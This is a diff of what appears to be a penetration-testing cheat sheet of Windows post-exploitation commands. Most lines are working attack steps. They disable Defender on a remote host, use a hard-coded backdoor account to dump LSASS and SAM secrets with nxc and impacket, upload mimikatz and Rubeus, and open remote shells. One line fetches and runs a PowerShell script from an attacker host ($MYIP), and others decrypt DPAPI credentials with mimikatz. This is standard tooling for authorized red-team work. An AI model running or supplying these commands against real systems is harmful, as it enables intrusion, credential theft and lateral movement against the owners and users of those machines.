@@ -1544,7 +1544,7 @@ Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { Set-MpPr
 Invoke-Command -ComputerName $computer -Credential $cred -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
 
 +---------- dbf: Account Created ----------+
-(nxc smb $TARGET -u dbf -p '123qweasdF!' -M lsassy --local-auth; impacket-secretsdump 'dbf:123qweasdF!'@$TARGET) | tee dump_$TARGET
+(nxc smb $TARGET -u dbf -p '123qweasdF!' --dpapi --local-auth; nxc smb $TARGET -u dbf -p '123qweasdF!' -M lsassy --local-auth; impacket-secretsdump 'dbf:123qweasdF!'@$TARGET) | tee dump_$TARGET
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/mimikatz.exe Windows\\Tasks\\mimikatz.exe
 nxc smb $TARGET -u dbf -p '123qweasdF!' --local-auth --put /Upload/windows/Rubeus.exe Windows\\Tasks\\Rubeus.exe
 evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!'
@@ -1564,7 +1564,7 @@ sekurlsa::dpapi
 
 +---------- DPAPI ----------+
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP/windows/dpapi.ps1')
-curl $MYIP/windows/mimikatz.exe -o \programdata\mimikatz.exe; \programdata\mimikatz.exe
+rlwrap winexe -U 'dbf%123qweasdF!' //$TARGET 'C:\Windows\Tasks\mimikatz.exe'
 dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /rpc
 dpapi::masterkey /in:"...\<USER>\...\...\Microsoft\Protect\<USER_SID>\<CRED_FILE>" /sid:<USER_SID> /password:$PASSWORD /protected
 dpapi::cred /masterkey:<MASTER_KEY> /in:"...\<USER>\...\...\Microsoft\Credentials\<ENCRYPTED_FILE>"
